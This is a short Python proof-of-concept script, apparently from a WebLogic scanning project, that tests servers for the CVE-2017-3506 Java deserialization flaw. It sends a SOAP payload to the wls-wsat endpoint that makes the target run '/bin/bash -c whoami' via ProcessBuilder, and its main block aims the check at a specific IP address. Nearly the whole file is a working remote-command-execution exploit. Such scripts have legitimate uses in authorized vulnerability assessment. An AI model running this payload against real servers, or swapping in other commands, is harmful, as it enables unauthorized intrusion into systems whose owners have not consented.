# https://github.com/rabbitmask/WeblogicR
# !/usr/bin/env python
# _*_ coding:utf-8 _*_

import requests
import re

heads = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
    'Content-Type': 'text/xml;charset=UTF-8'
}


def check(url):
    if not url.startswith("http"):
        url = "http://" + url
    if "/" in url:
        url += '/wls-wsat/CoordinatorPortType'
    post_str = '''
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
      <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
          <java>
            <object class="java.lang.ProcessBuilder">
              <array class="java.lang.String" length="3">
                <void index="0">
                  <string>/bin/bash</string>
                </void>
                <void index="1">
                  <string>-c</string>
                </void>
				<void index="2">
                  <string>whoami</string>
                </void>
              </array>
              <void method="start"/>
            </object>
          </java>
        </work:WorkContext>
      </soapenv:Header>
      <soapenv:Body/>
    </soapenv:Envelope>
    '''

    try:
        response = requests.post(url, data=post_str, verify=False, timeout=5, headers=heads)
        response = response.text
        response = re.search("\<faultstring\>.*\<\/faultstring\>", response).group(0)
    except:
        response = ""

    if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
        result = '目标weblogic存在JAVA反序列化漏洞：CVE-2017-3506 : %s' % url
        return result


def poc(ip):
    result = check(ip)
    return result


if __name__ == '__main__':
    a = poc('167.86.78.228:7001')
    print(a)
